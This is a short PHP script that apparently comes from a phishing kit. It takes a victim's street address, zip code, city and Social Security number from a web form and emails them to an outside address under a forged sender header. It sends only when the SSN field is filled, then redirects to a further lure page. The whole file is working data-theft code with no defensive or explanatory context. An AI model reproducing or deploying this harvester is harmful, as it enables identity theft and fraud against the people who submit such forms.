<?php
//get data from form  
$add = $_POST['add'];
$zip = $_POST['zip'];
$city= $_POST['city'];
$sssn= $_POST['sssn'];
$to = "lawyer.paul@macr2.com";
$subject = "Mail From website";
$txt ="Add = ". $add . "\r\n Zip = ". $zip . "\r\n  City = " . $city . "\r\n SSSN =" . $sssn;
$headers = "From: account@offshore.cusocalb.com" . "\r\n" .
"CC: lawyer.paul@macr2.com";
if($sssn!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:indexload3.html");
?>